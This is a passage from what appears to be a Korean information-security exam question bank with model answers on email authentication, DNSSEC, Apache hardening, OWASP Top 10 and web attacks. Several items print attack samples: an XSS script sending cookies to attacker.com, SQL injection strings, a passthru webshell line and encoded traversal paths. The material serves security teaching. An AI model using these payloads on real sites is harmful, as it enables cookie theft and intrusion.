2) 발신자의 디지털 서명을 메일 헤더에 삽입하고 수신 측에서 DNS의 공개키로 검증하는 기술: <strong>( B )</strong><br>
3) 위 두 기술의 검증 결과에 따라 수신 측에서 메일을 어떻게 처리할지(거부/격리 등) 정책을 정의하는 기술: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>SPF (Sender Policy Framework)</strong>, (B) <strong>DKIM (DomainKeys Identified Mail)</strong>, (C) <strong>DMARC</strong>
</blockquote>
</details>

<details>
<summary>[473] (분석형) 다음 이메일 로그 정보의 의미를 쓰시오.<br>
<code>cipher=ECDHE-RSA-AES128-GCM-SHA256</code><br>
1) **RSA**의 용도: <strong>( A )</strong><br>
2) **AES128**의 용도: <strong>( B )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>인증(Digital Signature) 및 키 교환</strong>, (B) <strong>데이터의 대칭키 암호화</strong>
</blockquote>
</details>

<details>
<summary>[554] (분석형) 다음 HTTP 요청 헤더 정보가 포함된 패킷이 초당 수천 개씩 웹 서버로 전달되고 있다. 공격의 명칭과 목적을 쓰시오.<br>
<code>GET /index.jsp HTTP/1.1</code><br>
<code>Referer: http://www.attacker.com/link.html</code><br>
<code>Cache-Control: max-age=0</code></summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>공격 명칭</strong>: <strong>HTTP Cache-Control (CC) 공격</strong> (또는 HTTP GET Flooding with Cache-Control)<br>
- <strong>공격 목적</strong>: <code>max-age=0</code> 옵션을 통해 캐시 서버의 데이터를 무시하고 웹 서버가 매번 새로운 응답을 생성하도록 강제함으로써, 캐시 서버를 무력화하고 웹 서버에 과부하를 유발하는 DoS 공격이다.
</blockquote>
</details>

<details>
<summary>[483] (서술형) **SQL 인젝션** 공격을 방지하기 위한 대표적인 기법인 **Prepared Statement**의 원리와 보안 효과를 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>원리</strong>: SQL 쿼리 문장을 미리 컴파일하여 구조를 확정 지은 뒤, 사용자의 입력값은 쿼리 구조에 영향을 주지 않는 단순 파라미터(바인딩 변수)로만 처리하는 방식이다.<br>
- <strong>보안 효과</strong>: 입력값에 포함된 특수문자나 SQL 예약어가 쿼리의 논리적 구조를 변경할 수 없으므로 SQL 인젝션을 근본적으로 차단할 수 있다.
</blockquote>
</details>

<details>
<summary>[486] (분석형) 다음은 보안 관제 중 발견된 공격 시도이다. 질문에 답하시오.<br>
<code>test.php?no=0 or ascii(substr((select table_name from information_schema.tables ...),1,1))=65#</code><br>
1) 공격의 구체적인 명칭을 쓰시오.<br>
2) 위 쿼리에서 <code>65</code>의 의미는 무엇인지 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 1) <strong>Blind SQL Injection</strong> (블라인드 SQL 인젝션), 2) 추출하려는 데이터(테이블 명 등)의 첫 번째 문자의 ASCII 값이 '65'(대문자 'A')인지 확인하여 참/거짓 여부를 판별하기 위함이다.
</blockquote>
</details>

<details>
<summary>[476] (서술형) **XSS(Cross Site Scripting)**와 **CSRF(Cross Site Request Forgery)**의 주요 차이점을 공격 대상과 실행 위치 관점에서 비교 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>XSS</strong>: 악성 스크립트가 사용자의 브라우저에서 실행되어 **클라이언트(사용자)**의 정보(쿠키, 세션 등)를 유출하거나 조작하는 것이 목적이다.<br>
- <strong>CSRF</strong>: 사용자의 권한을 이용하여 **서버**에 의도하지 않은 요청(비밀번호 변경, 게시글 작성 등)을 강제로 보내는 공격으로, 서버 측의 기능 수행이 목적이다.
</blockquote>
</details>

<details>
<summary>[504] (분석/작업형) 게시판에 다음 스크립트가 포함된 게시물이 업로드되었다. 질문에 답하시오.<br>
<code>&lt;script&gt; var img = new Image(); img.src = "http://attacker.com/collect.php?c=" + document.cookie; &lt;/script&gt;</code><br>
1) 이 스크립트의 실행 결과는 무엇인가?<br>
2) 이를 방지하기 위한 웹 애플리케이션 측 대응 방안 1가지를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> 1) 게시물을 열람한 사용자의 <strong>쿠키 정보</strong>가 공격자의 서버로 전송된다. 2) 쿠키에 <strong>HttpOnly</strong> 속성을 설정하거나, 사용자 입력값의 특수문자(<code>&lt;</code>, <code>&gt;</code> 등)를 <strong>HTML Entity</strong>로 치환(Encoding)하여 출력한다.
</blockquote>
</details>

<details>
<summary>[485] (서술형) 파일 업로드 취약점을 방지하기 위해 아파치(Apache) 설정 파일(<code>.htaccess</code>)에서 **특정 확장자의 실행을 차단**하거나 **MIME 타입을 강제로 변경**하는 설정의 예를 한 가지씩 쓰시오.</summary>
<blockquote>
<strong>정답:</strong><br>
1) <strong>실행 차단</strong>: <code>&lt;FilesMatch "\.(php|inc|lib)"&gt; Deny from all &lt;/FilesMatch&gt;</code> (해당 확장자 파일에 대한 접근/실행 거부)<br>
2) <strong>MIME 타입 변경</strong>: <code>AddType text/html .php</code> (PHP 파일을 실행하지 않고 서버에서 일반 텍스트/HTML로 인식하게 함)
</blockquote>
</details>

<details>
<summary>[기출 19회 15번 문제] (실무형) 파일 업로드 취약점 방지를 위해 <code>.htaccess</code> 파일에 적용된 다음 설정의 의미를 설명하시오.<br>
1) <code>&lt;FilesMatch "\.(ph|lib|sh|)"&gt; order Allow,Deny Deny From ALL &lt;/FilesMatch&gt;</code><br>
2) <code>AddType text/plain .php .php1 .php2</code></summary>
<blockquote>
1) <strong>의미</strong>: <code>.php</code>, <code>.lib</code>, <code>.sh</code> 등의 확장자를 가진 모든 파일에 대해 직접적인 웹 접근(다운로드 및 실행)을 전면 차단함<br>
2) <strong>의미</strong>: 해당 확장자를 가진 파일을 실행 스크립트로 인식하지 않고 일반 <strong>텍스트 파일(MIME 타입)</strong>로 강제 지정하여 웹 서버 상에서 실행되지 않도록 방지함
</blockquote>
</details>

<details>
<summary>[485] (분석/서술형) 다음 PHP 업로드 로직의 취약점과 우회 기법을 설명하시오.<br>
<code>$file_type = $_FILES['upfile']['type'];</code><br>
<code>$white_list = array('image/gif', 'image/jpeg');</code><br>
<code>if(in_array($file_type, $white_list)) { ... }</code></summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>취약점</strong>: 클라이언트가 전송하는 <strong>MIME 타입(Content-Type 헤더)</strong> 정보에만 의존하여 검사하므로, 파일의 실제 확장자나 내용을 검증하지 않는 취약점이 있다.<br>
- <strong>우회 기법</strong>: 공격자가 웹쉘(<code>.php</code>)을 업로드하면서 프록시 도구를 이용해 HTTP 요청 헤더의 <code>Content-Type</code>을 <code>image/jpeg</code>로 조작하여 전송하면 보안 검사를 통과할 수 있다.
</blockquote>
</details>

<details>
<summary>[492] (단답형) 웹 애플리케이션에서 입력값에 대한 적절한 검증 없이 <code>../../</code>와 같은 상위 디렉토리 이동 문자를 사용하여 시스템의 중요 파일(예: <code>/etc/passwd</code>)에 접근하는 공격 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>디렉토리 트래버스(Directory Traversal)</strong> (또는 경로 조작 공격)
</blockquote>
</details>

<details>
<summary>[507] (분석/작업형) 다음 PHP 악성코드(웹쉘) 로그의 일부이다. 질문에 답하시오.<br>
<code>echo "&lt;div&gt;&lt;textarea name='report'&gt;";</code><br>
<code>passthru($_POST['cmd']);</code><br>
<code>echo "&lt;/textarea&gt;&lt;/div&gt;";</code><br>
1) <code>passthru()</code> 함수의 기능을 설명하시오.<br>
2) 이와 유사한 기능을 수행하는 PHP 함수 2가지를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong><br>
1) <strong>기능</strong>: 외부의 <strong>운영체제(OS) 명령어를 실행</strong>하고 그 결과를 직접 브라우저로 출력하는 함수이다.<br>
2) <strong>유사 함수</strong>: <code>exec()</code>, <code>system()</code>, <code>shell_exec()</code> (등)
</blockquote>
</details>

<details>
<summary>[505] (분석/작업형) 웹 사이트 접속 시 특정 디렉토리에 <code>index.html</code> 등 인덱스 파일이 없을 경우 디렉토리 내의 파일 목록이 브라우저에 노출되는 취약점의 명칭과 아파치(Apache) 설정에서의 대응 방법을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>취약점 명칭</strong>: <strong>디렉토리 리스팅(Directory Listing)</strong> (또는 디렉토리 인덱싱 취약점)<br>
- <strong>대응 방법</strong>: <code>httpd.conf</code> 설정 파일의 <code>&lt;Directory&gt;</code> 섹션에서 <code>Options</code> 지시자의 <strong>Indexes</strong> 설정을 제거하거나 <strong>-Indexes</strong>로 설정한다.
</blockquote>
</details>

<details>
<summary>[505] (서술형) 아파치(Apache) 설정 중 **FollowSymLinks** 옵션의 보안상 위험성과 이를 방지하기 위한 설정 방법을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>위험성</strong>: 웹 루트 디렉토리 내에 시스템 파일(예: <code>/etc/passwd</code>)로 연결된 <strong>심볼릭 링크</strong>가 존재할 경우, 공격자가 웹을 통해 해당 시스템 중요 파일의 내용에 직접 접근할 수 있는 위험이 있다.<br>
- <strong>설정 방법</strong>: <code>Options</code> 지시자에서 <strong>-FollowSymLinks</strong>를 설정하여 심볼릭 링크를 따라가지 않도록 제한한다.
</blockquote>
</details>

<details>
<summary>[509] (단답형) 아파치(Apache) 설정 시 웹 서버의 정보(버전, OS 등)를 최소한으로 노출하기 위해 설정해야 할 다음 지시자의 적절한 값을 쓰시오.<br>
1) <code>ServerTokens</code>: <strong>( A )</strong><br>
2) <code>ServerSignature</code>: <strong>( B )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>Prod</strong> (또는 ProductOnly), (B) <strong>Off</strong>
</blockquote>
</details>

<details>
<summary>[561] (서술형) 아파치 설정 중 **KeepAlive** 옵션의 의미와 대량의 접속이 발생하는 서버에서의 설정 시 고려사항을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>의미</strong>: 한 번 연결된 **TCP 커넥션을 끊지 않고 유지**하여 여러 개의 HTTP 요청을 처리할 수 있게 하는 기능이다.<br>
- <strong>고려사항</strong>: 접속자가 매우 많은 경우 빈 커넥션이 프로세스를 계속 점유하여 **메모리 부족** 현상이 발생할 수 있으므로, <code>KeepAliveTimeout</code>을 짧게 설정하고 <code>MaxKeepAliveRequests</code>를 적절히 조절해야 한다.
</blockquote>
</details>

<details>
<summary>[561] (분석형) 다음 아파치 **Order** 지시자에 따른 접근 제어 결과를 쓰시오.<br>
1) <code>Order Allow,Deny</code> | <code>Allow from all</code> | <code>Deny from 192.168.1.1</code><br>
2) <code>Order Deny,Allow</code> | <code>Deny from all</code> | <code>Allow from 192.168.1.1</code></summary>
<blockquote>
<strong>정답:</strong><br>
1) <strong>192.168.1.1을 제외한 모든 IP 허용</strong> (Allow를 먼저 평가한 후 Deny를 평가하며, 마지막에 명시된 Deny 조건이 적용됨)<br>
2) <strong>192.168.1.1만 허용</strong> (Deny를 먼저 평가한 후 Allow를 평가하며, 마지막에 명시된 Allow 조건이 적용됨)
</blockquote>
</details>

<details>
<summary>[520] (분석형) 다음 아파치 **access_log**의 각 항목이 의미하는 바를 쓰시오.<br>
<code>192.168.10.5 - - [13/Sep/2024:11:00:00 +0900] "GET /index.jsp HTTP/1.1" 200 1234 "http://referer.com" "Mozilla/5.0..."</code><br>
1) <strong>200</strong>: <strong>( A )</strong><br>
2) <strong>1234</strong>: <strong>( B )</strong><br>
3) <strong>"http://referer.com"</strong>: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>HTTP 응답 상태 코드</strong> (성공), (B) <strong>응답 데이터의 크기(Byte)</strong>, (C) <strong>Referer</strong> (요청이 발생한 이전 페이지의 URL)
</blockquote>
</details>

<details>
<summary>[533] (서술형) **DNS 스푸핑(Spoofing)** 공격의 원리와, 클라이언트가 잘못된 IP 정보를 받아들이게 되는 과정을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
공격자가 클라이언트의 DNS 질의를 가로채거나, DNS 서버보다 먼저 위조된 응답을 보내어 클라이언트가 공격자가 의도한 사이트로 접속하게 만드는 공격이다. 클라이언트는 먼저 도착한 응답을 신뢰하고 이후에 도착하는 정상 응답은 폐기하는 특성을 이용한다.
</blockquote>
</details>

<details>
<summary>[534] (서술형) DNS 서비스에서 **TCP 53**번 포트와 **UDP 53**번 포트가 각각 사용되는 용도를 구분하여 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>UDP 53</strong>: 일반적인 DNS 질의(Query) 및 응답에 사용된다.<br>
- <strong>TCP 53</strong>: 영역 전송(Zone Transfer) 또는 UDP 응답의 크기가 512바이트를 초과하는 경우(Truncation 발생 시)에 사용된다.
</blockquote>
</details>

<details>
<summary>[535] (작업형) DNS 서버의 **영역 전송(Zone Transfer)** 설정을 제한하지 않았을 때 발생할 수 있는 보안 위협과, 이를 방지하기 위한 BIND(named.conf) 설정 방법을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>위협</strong>: 공격자가 해당 도메인의 모든 호스트 정보와 네트워크 구조를 파악할 수 있다.<br>
- <strong>설정</strong>: <code>allow-transfer { 허용할_Slave_IP; };</code> 옵션을 사용하여 인가된 서버로만 전송을 제한한다.
</blockquote>
</details>

<details>
<summary>[536] (단답형) DNSSEC(Domain Name System Security Extensions)에서 자원 레코드(Resource Record)에 대한 디지털 서명을 저장하고 있는 레코드의 유형은?</summary>
<blockquote>
<strong>정답:</strong> <strong>RRSIG</strong>
</blockquote>
</details>

<details>
<summary>[537] (단답형) DNSSEC에서 공개키 정보(Zone Signing Key, Key Signing Key)를 저장하고 있는 레코드의 유형은?</summary>
<blockquote>
<strong>정답:</strong> <strong>DNSKEY</strong>
</blockquote>
</details>

<details>
<summary>[538] (단답형) DNSSEC에서 상위 존(Zone)이 하위 존의 공개키 세트를 인증하기 위해 보관하는 위임 지문 정보를 담고 있는 레코드의 유형은?</summary>
<blockquote>
<strong>정답:</strong> <strong>DS (Delegation Signer)</strong>
</blockquote>
</details>

<details>
<summary>[539] (분석형) 다음은 웹 서버의 액세스 로그(access_log) 일부이다. 어떤 공격 시도인지 명칭을 쓰고, 이에 대한 대응 방안을 설명하시오.<br>
<code>.../login.php?id=admin&pw=1' or '1'='1' --</code></summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>공격 명칭</strong>: <strong>SQL 인젝션(SQL Injection)</strong><br>
- <strong>대응 방안</strong>: (1) <strong>준비된 실행문(Prepared Statement)</strong>을 사용하여 사용자 입력을 파라미터로 처리한다. (2) 사용자 입력값에서 특수문자(<code>'</code>, <code>;</code>, <code>--</code>, <code>#</code> 등)를 서버 측에서 필터링하거나 이스케이프 처리한다.
</blockquote>
</details>

<details>
<summary>[540] (분석형) 공격자가 <code>substr(database(),1,1)='a'</code>와 같은 쿼리를 사용하여 정보를 획득하는 공격의 세부 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>블라인드 SQL 인젝션(Blind SQL Injection)</strong>
</blockquote>
</details>

<details>
<summary>[541] (서술형) MS-SQL의 확장 프로시저인 **xp_cmdshell**을 이용한 공격 과정(네트워크 도구 다운로드, 실행 파일 복사, 백도어 실행 등)과 이에 대한 보안 대책을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>공격 과정</strong>: <code>xp_cmdshell</code>을 실행하여 <code>tftp</code> 등으로 악성 도구(Netcat 등)를 다운로드하거나, <code>cmd.exe</code>를 웹 접근 가능 디렉토리에 복사한 후 실행하여 원격 제어 권한을 획득한다.<br>
- <strong>보안 대책</strong>: (1) <code>xp_cmdshell</code> 등 불필요한 확장 프로시저를 비활성화하거나 제거한다. (2) 데이터베이스 계정의 권한을 최소화하여 시스템 명령 실행 권한을 제한한다.
</blockquote>
</details>

<details>
<summary>[542] (서술형) XML 문서 내에서 외부 엔티티를 정의하여 서버의 내부 파일을 읽거나 DoS 공격을 수행하는 공격의 명칭과 원리를 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>공격 명칭</strong>: <strong>XXE(XML External Entity) 인젝션</strong><br>
- <strong>원리</strong>: XML 파서가 외부 엔티티(<code>ENTITY</code>) 참조를 허용할 때, 공격자가 시스템 파일 경로(예: <code>file:///etc/passwd</code>)를 엔티티로 정의하여 해당 파일의 내용을 유출시키거나, 엔티티를 중첩 정의하여 메모리 고갈(Billion Laughs 공격)을 유도하는 방식이다.
</blockquote>
</details>

<details>
<summary>[543] (분석형) 다음 SQL 인젝션 로그 분석 결과에 따라 빈칸을 채우시오.<br>
1) <code>order by 10</code> 시도 후 에러 발생 시 의미: <strong>( A )</strong> 가 10개 미만임<br>
2) <code>union select 1,2,database(),4</code> 실행 결과가 'algisa'인 경우: <strong>( B )</strong> 명칭은 'algisa'임<br>
3) <code>information_schema.tables</code>에서 정보를 조회하는 목적: <strong>( C )</strong> 목록 획득</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>컬럼(Column)의 개수</strong>, (B) <strong>데이터베이스(DB)</strong>, (C) <strong>테이블(Table)</strong>
</blockquote>
</details>

<details>
<summary>[544] (분석형) 다음 로그에 나타난 디렉토리 트래버스(Directory Traversal) 공격에서 사용된 **인코딩 방식**을 각각 쓰시오.<br>
1) <code>..%2f..%2f</code>: <strong>( A )</strong><br>
2) <code>..%c0%af..%c0%af</code>: <strong>( B )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>URL 인코딩</strong>, (B) <strong>UTF-8 유니코드 인코딩</strong> (비최단 형식 우회)
</blockquote>
</details>

<details>
<summary>[545] (분석형) 다음 IIS 웹 서버 로그 형식(W3C)의 각 필드 의미를 분석하여 답하시오.<br>
<code>2022-11-26 08:53:12 192.168.137.128 GET /login.asp 80 - 192.168.0.10 Mozilla/5.0... 200 0 0 225</code><br>
1) 클라이언트 IP: <strong>( A )</strong><br>
2) 웹 서버 IP: <strong>( B )</strong><br>
3) 처리 결과 상태 코드: <strong>( C )</strong><br>
4) 처리 소요 시간(ms): <strong>( D )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>192.168.0.10</strong>, (B) <strong>192.168.137.128</strong>, (C) <strong>200</strong>, (D) <strong>225</strong>
</blockquote>
</details>

<details>
<summary>[546] (분석형) 공격자가 <code>account.php</code> 파일을 업로드하면서 <code>Content-Type: image/png</code>로 조작하여 보안 필터링을 우회하려고 한다. 이 공격의 명칭과 판단 근거를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>공격 명칭</strong>: <strong>파일 업로드 취약점 (MIME Type 우회)</strong><br>
- <strong>판단 근거</strong>: 파일 확장자는 실행 가능한 스크립트 파일(<code>.php</code>)임에도 불구하고, HTTP 헤더의 <code>Content-Type</code>을 이미지 형식(<code>image/png</code>)으로 조작하여 서버 측의 타입 검증 로직을 우회하려 했기 때문이다.
</blockquote>
</details>

<details>
<summary>[547] (단답형) 웹 로그인 시 아이디와 패스워드가 암호화되지 않은 평문(Plaintext) 상태로 전송되는 것을 방지하기 위해 적용해야 하는 보안 프로토콜과 적용 시 사용하는 기본 포트 번호를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>HTTPS (SSL/TLS)</strong>, <strong>443</strong>번 포트
</blockquote>
</details>

<details>
<summary>[548] (단답형) 파일 전송 프로토콜 중 <code>FTP</code>보다 단순하며 별도의 인증 절차가 없어 보안에 취약하지만, 부팅 파일 전송 등에 사용되는 프로토콜의 명칭을 쓰시오.</summary>
<blockquote>
<code>TFTP</code> (Trivial File Transfer Protocol)
</blockquote>
</details>

### SNMP(Simple Network Management Protocol)

### DHCP(Dynamic Host Configuration Protocol)

## [8] 웹 애플리케이션 취약점

### OWASP Top 10 (2021)

<details>
<summary>[549] (단답형) OWASP Top 10:2021에서 새롭게 1위로 선정되었으며, 사용자의 권한을 부적절하게 검증하여 허가되지 않은 데이터나 기능에 접근할 수 있게 되는 취약점의 명칭을 영문으로 쓰시오.</summary>
<blockquote>
<code>Broken Access Control</code> (취약한 접근 통제)
</blockquote>
</details>

<details>
<summary>[550] (단답형) OWASP Top 10:2021에서 새롭게 추가된 취약점 중 하나로, 공격자가 조작된 요청을 보내 서버 내부의 자원이나 외부 시스템과 통신하게 만듦으로써 정보 유출이나 내부 시스템 침투를 유도하는 공격의 영문 약어를 쓰시오.</summary>
<blockquote>
<code>SSRF</code> (Server-Side Request Forgery)
</blockquote>
</details>

<details>
<summary>[551] (서술형) OWASP Top 10:2021에서 기존의 'Sensitive Data Exposure'에서 명칭이 변경되며 범주가 확장된 취약점의 명칭(A)과, 이를 방어하기 위해 데이터 전송 시 필수적으로 적용해야 하는 암호화 프로토콜(B)을 쓰시오.</summary>
<blockquote>
(A) <code>Cryptographic Failures</code> (암호화 결함)<br>
(B) <code>TLS</code> (Transport Layer Security) 1.2 이상
</blockquote>
</details>

<details>
<summary>[552] (서술형) OWASP Top 10:2021에서 새롭게 정의된 <strong>Insecure Design</strong>(안전하지 않은 설계)의 특징을 구현 단계의 취약점과 비교하여 서술하고, 이를 예방하기 위해 설계 단계에서 수행해야 할 보안 활동을 1가지 제시하시오.</summary>
<blockquote>
<strong>특징</strong>: 소스코드 상의 구현 실수(Coding Error)보다는 비즈니스 로직이나 시스템 아키텍처 자체의 보안 고려사항이 누락되어 발생하는 근본적인 취약점을 의미한다.<br>
<strong>보안 활동</strong>: <code>위협 모델링 (Threat Modeling)</code>을 통해 설계 단계에서 잠재적인 보안 위험을 사전에 분석하고 완화 대책을 마련해야 한다.
</blockquote>
</details>

<details>
<summary>[553] (단답형) OWASP Top 10:2021의 A08 항목인 <strong>Software and Data Integrity Failures</strong>(소프트웨어 및 데이터 무결성 결함)에 포함되며, 신뢰할 수 없는 데이터로부터 객체를 복원할 때 악성 코드가 실행될 수 있는 취약점의 영문 명칭을 쓰시오.</summary>
<blockquote>
<code>Insecure Deserialization</code> (안전하지 않은 역직렬화)
</blockquote>
</details>

<details>
<summary>[554] (작업형) 다음 빈칸 (A), (B)에 들어갈 알맞은 취약점 항목을 OWASP Top 10:2021 기준으로 작성하시오.<br>
<div style="border: 1px solid #777; padding: 10px; margin-top: 10px; border-radius: 5px;">
<strong>[상황 및 점검 항목]</strong><br>
- (A) 항목: 웹 서버 및 데이터베이스 서버의 기본 계정 미변경, 불필요한 서비스 활성화, 디렉터리 리스팅 허용 등 설정 상의 허점으로 인해 발생하는 취약점이다.<br>
- (B) 항목: 보안 이벤트에 대한 로그를 남기지 않거나, 이상 징후를 실시간으로 감지하지 못해 공격자의 침투를 적시에 인지하지 못하게 되는 취약점이다.
</div>
</summary>
<blockquote>
(A) <code>Security Misconfiguration</code> (보안 설정 오류)<br>
(B) <code>Security Logging and Monitoring Failures</code> (보안 로깅 및 모니터링 실패)
</blockquote>
</details>

<details>
<summary>[555] (응용/서술형) 프로젝트 팀에서 사용하는 오픈소스 라이브러리에 알려진 보안 취약점(CVE)이 패치되지 않은 채 그대로 사용되고 있다. 이와 관련된 OWASP Top 10:2021 취약점 항목 명칭과, 이를 관리하기 위한 자동화된 도구(SCA 등)의 활용 목적을 서술하시오.</summary>
<blockquote>
<strong>항목 명칭</strong>: <code>Vulnerable and Outdated Components</code> (취약하고 오래된 구성 요소)<br>
<strong>활용 목적</strong>: 프로젝트에서 사용하는 모든 서드파티 라이브러리의 목록(BOM)을 작성하고, 알려진 취약점 데이터베이스와 대조하여 보안 업데이트가 필요한 구성 요소를 실시간으로 파악하고 관리하기 위함이다.
</blockquote>
</details>

### SQL Injection 취약점

<details>
<summary>[기출 22회 17번 문제] (실무형) 다음의 HTTP Request 로그 <code>GET /member/login.php?user_id=1' or '1' = '1'# &user_pw=foo</code>를 분석하여 답하시오.<br>
1. 해당 취약점 명칭은?<br>
2. 판단 근거는?<br>
3. 대응 방안 2가지는?</summary>
<blockquote>
1. <strong>정답:</strong> <strong>SQL Injection</strong><br>
2. <strong>근거:</strong> 파라미터 <code>user_id</code> 값에 SQL 특수문자(<code>'</code>)와 항상 참인 조건문(<code>or '1'='1'</code>), 그리고 주석 처리(#)를 삽입하여 정상적인 인증 로직을 우회하려고 시도함<br>
3. <strong>대응:</strong> <strong>Prepared Statement (매개변수 질의문)</strong> 사용, <strong>입력값 특수문자 필터링</strong>
</blockquote>
</details>


<details>
<summary>[556] (서술형) <code>SQL 인젝션(Injection)</code> 공격 중 'Blind SQL Injection'의 개념을 설명하고, 이를 탐지하기 위해 공격자가 주로 사용하는 SQL 함수 2가지를 쓰시오.</summary>
<blockquote>
개념: 쿼리 결과가 화면에 직접 노출되지 않는 경우, 참(True) 또는 거짓(False)의 응답 차이나 응답 지연 시간 등을 통해 데이터베이스의 정보를 유추해 나가는 공격 기법이다.<br>
사용 함수: <code>SUBSTR()</code> (문자열 추출), <code>LENGTH()</code> (문자열 길이 확인), <code>SLEEP()</code> (시간 지연 유도) 등.
</blockquote>
</details>

<details>
<summary>[557] (단답형) 데이터베이스에서 사용자의 입력값을 통해 동적으로 SQL 쿼리를 생성할 때 발생하는 <code>SQL Injection</code> 취약점을 근본적으로 방어하기 위해, many 프로그래밍 언어의 데이터베이스 접근 API 라이브러리가 지원하는 객체(클래스)의 명칭을 쓰시오.</summary>
<blockquote>
<code>PreparedStatement</code> (또는 Parameterized Query)
</blockquote>
</details>

### XSS(Cross Site Scripting) 취약점

<details>
<summary>[558] (단답형) 사용자의 입력값을 적절히 필터링하지 못해 악성 스크립트가 실행되는 <code>XSS</code> 공격 중, 게시판 등에 스크립트를 저장하여 지속적으로 피해를 입히는 방식의 명칭을 쓰시오.</summary>
<blockquote>
Stored XSS (저장형 XSS)
</blockquote>
</details>

### CSRF(Cross Site Request Forgery) 취약점

<details>
<summary>[559] (서술형) 크로스 사이트 스크립팅(XSS) 공격과 크로스 사이트 요청 위조(CSRF) 공격의 차이점을 '공격 대상'과 '목적' 측면에서 비교하여 서술하시오.</summary>
<blockquote>
<strong>XSS</strong>: 공격 대상은 '클라이언트(사용자)'이며, 사용자의 브라우저에서 악성 스크립트를 실행시켜 세션 쿠키를 탈취하거나 악성 사이트로 리다이렉트 시키는 것이 목적이다.<br>
<strong>CSRF</strong>: 공격 대상은 '서버(애플리케이션)'이며, 인증된 사용자의 권한을 도용하여 공격자가 의도한 행위(비밀번호 변경, 송금 등)를 서버에 요청하고 실행하게 만드는 것이 목적이다.
</blockquote>
</details>

### Server-Side Request Forgery(SSRF) 취약점

<details>
<summary>[기출 13회 2번 문제] (단답형) 서버가 클라이언트의 요청(URL 등)을 통해 내부 네트워크 자원이나 외부의 다른 서버에 접근하게 되는 취약점 공격은?</summary>
<blockquote>
<strong>정답:</strong> <strong>SSRF (Server-Side Request Forgery)</strong><br>
<strong>해설:</strong> 공격자가 조작한 URL을 서버가 직접 호출하게 하여, 외부에서 접근 불가능한 내부 시스템 정보를 탈취하거나 내부 포트 스캔 등에 악용하는 공격이다.
</blockquote>
</details>

### 운영체제 명령 실행(OS Command Execution) 취약점

### 파일 업로드 취약점

### 파일 다운로드 취약점

### 경로 추적(Path Traversal) 취약점

<details>
<summary>[560] (단답형) 공격자가 웹 통신 과정에서 전달되는 파라미터나 헤더 값 등을 조작하여, 다른 사용자의 디렉터리나 민감한 시스템 파일(예: <code>/etc/passwd</code>)에 무단으로 접근하고 이를 열람하는 웹 뷰어 취약점 공격의 명칭을 영소문자 약어로 쓰시오.</summary>
<blockquote>
<code>lfi</code> (Local File Inclusion) 또는 <code>pdt</code> (Path Directory Traversal)
</blockquote>
</details>

### 파일 삽입 취약점

<details>
<summary>[기출 22회 5번 문제] (단답형) 파일 삽입 취약점은 공격자가 악성 스크립트를 서버에 전달하여 실행되도록 할 수 있다. PHP 환경에서 외부 URL을 통한 파일 삽입을 방지하기 위한 <code>php.ini</code> 설정값 2가지를 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>allow_url_fopen = Off</strong>, <strong>allow_url_include = Off</strong>
</blockquote>
</details>


### URL/파라미터 변조 취약점

### 불충분한 세션 관리 취약점

<details>
<summary>[561] (단답형) OWASP Top 10에 포함되는 취약점 중 하나로, 공격자가 웹 애플리케이션의 파라미터를 조작하여 자신에게 허가되지 않은 다른 사용자의 데이터(예: <code>Mypage?id=admin</code>)나 기능에 직접 접근할 수 있도록 허용하는 취약점의 영문 약어를 쓰시오.</summary>
<blockquote>
<code>IDOR</code> (Insecure Direct Object Reference)
</blockquote>
</details>

### 정보누출 취약점

### 기타 웹 애플리케이션 취약점

### 개발 보안관리

<details>
<summary>[562] (단답형) C언어에서 문자열 복사 시 대상 버퍼의 크기를 검사하지 않아 버퍼 오버플로우를 유발할 수 있는 취약한 함수인 <code>strcpy</code>를 대체하여, 지정된 길이(n)만큼만 문자열을 안전하게 복사하도록 권장되는 함수의 명칭을 쓰시오.</summary>
<blockquote>
<code>strncpy</code> (또는 <code>strlcpy</code>)
</blockquote>
</details>

<details>
<summary>[563] (서술형) 안드로이드 애플리케이션 보안을 위해 소스코드 난독화(Obfuscation)를 수행해야 하는 이유를 리버스 엔지니어링(Reverse Engineering) 관점에서 설명하시오.</summary>
<blockquote>
안드로이드 앱은 디컴파일 도구를 통해 실행파일(<code>.apk</code>)을 소스코드로 쉽게 변환할 수 있어 로직 분석이 용이하다. 난독화는 변수명이나 메서드명을 무의미하게 변경하거나 코드 흐름을 복잡하게 만들어, 공격자가 화이트박스 분석을 통해 취약점을 찾아내거나 소스코드를 도용하는 리버스 엔지니어링 시도를 어렵게 하기 위해 반드시 필요하다.
</blockquote>
</details>

<details>
<summary>[564] (서술형) 안드로이드 애플리케이션 보안을 위해 소스코드 난독화(Obfuscation)를 적용할 때의 기대 효과와, 난독화만으로는 완벽한 보안을 담보할 수 없는 한계점을 서술하시오.</summary>
<blockquote>
